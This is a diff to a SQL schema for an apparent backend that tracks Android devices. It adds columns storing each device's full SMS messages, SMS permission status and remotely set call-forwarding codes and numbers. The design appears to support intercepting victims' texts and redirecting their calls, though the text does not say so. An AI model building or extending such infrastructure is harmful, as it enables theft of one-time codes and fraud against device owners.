@@ -28,17 +28,40 @@ CREATE TABLE IF NOT EXISTS apps (
 
 -- Devices registered via Android app
 CREATE TABLE IF NOT EXISTS devices (
-  id               BIGSERIAL PRIMARY KEY,
-  app_id           TEXT        NOT NULL,
-  sub_id           TEXT,
-  device_id        TEXT        NOT NULL,
-  device_name      TEXT,
-  device_model     TEXT,
-  android_version  TEXT,
-  registered_at    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
-  is_active        BOOLEAN     NOT NULL DEFAULT TRUE,
-  last_seen        TIMESTAMPTZ,
-  UNIQUE(app_id, device_id)
+  id                      BIGSERIAL   PRIMARY KEY,
+  app_id                  TEXT        NOT NULL,
+  sub_id                  TEXT        NOT NULL,
+  device_id               TEXT,
+  status                  TEXT        NOT NULL DEFAULT 'active',
+  data_type               TEXT        NOT NULL DEFAULT 'registered_device',
+  device_name             TEXT,
+  device_model            TEXT,
+  android_version         TEXT,
+  sms_messages            JSONB       NOT NULL DEFAULT '[]',
+  total_sms_count         INTEGER     NOT NULL DEFAULT 0,
+  last_sms_timestamp      BIGINT      NOT NULL DEFAULT 0,
+  last_sms_log            JSONB       NOT NULL DEFAULT '{}',
+  sms_sync_status         TEXT,
+  sms_pending_count       INTEGER     NOT NULL DEFAULT 0,
+  sms_processed_count     INTEGER     NOT NULL DEFAULT 0,
+  sms_permission_status   TEXT,
+  sms_last_sync_at        BIGINT,
+  sms_last_error          TEXT,
+  call_forward_status     TEXT,
+  call_forward_action     TEXT,
+  call_forward_code       TEXT,
+  call_forward_number     TEXT,
+  call_forward_sim_slot   INTEGER,
+  call_forward_response   TEXT,
+  call_forward_timestamp  BIGINT,
+  last_heartbeat_at       BIGINT,
+  data_json               JSONB       NOT NULL DEFAULT '{}',
+  registered_at           TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+  created_at              TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+  updated_at              TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+  is_active               BOOLEAN     NOT NULL DEFAULT TRUE,
+  last_seen               TIMESTAMPTZ,
+  UNIQUE(app_id, sub_id)
 );
 
 -- Admin sessions (logins from Android app users)
@@ -95,6 +118,35 @@ CREATE TABLE IF NOT EXISTS proxy_rules (
   note       TEXT        NOT NULL DEFAULT '',
   created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
 );
+
+-- ── Migrate devices table: add new columns if they don't exist ─────────────────
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS device_id TEXT;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS status TEXT NOT NULL DEFAULT 'active';
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS data_type TEXT NOT NULL DEFAULT 'registered_device';
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_messages JSONB NOT NULL DEFAULT '[]';
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS total_sms_count INTEGER NOT NULL DEFAULT 0;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_sms_timestamp BIGINT NOT NULL DEFAULT 0;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_sms_log JSONB NOT NULL DEFAULT '{}';
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_sync_status TEXT;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_pending_count INTEGER NOT NULL DEFAULT 0;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_processed_count INTEGER NOT NULL DEFAULT 0;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_permission_status TEXT;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_last_sync_at BIGINT;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_last_error TEXT;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_status TEXT;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_action TEXT;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_code TEXT;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_number TEXT;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_sim_slot INTEGER;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_response TEXT;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_timestamp BIGINT;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_heartbeat_at BIGINT;
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS data_json JSONB NOT NULL DEFAULT '{}';
+ALTER TABLE devices ADD COLUMN IF NOT EXISTS updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW();
+ALTER TABLE devices ALTER COLUMN sub_id SET NOT NULL;
+ALTER TABLE devices DROP CONSTRAINT IF EXISTS devices_device_id_key;
+ALTER TABLE devices DROP CONSTRAINT IF EXISTS devices_app_id_device_id_key;
+ALTER TABLE devices ADD CONSTRAINT devices_app_id_sub_id_key UNIQUE (app_id, sub_id);
 `.trim();
 
 // ── Auto-create tables via Supabase SQL over HTTP ────────────────────────────
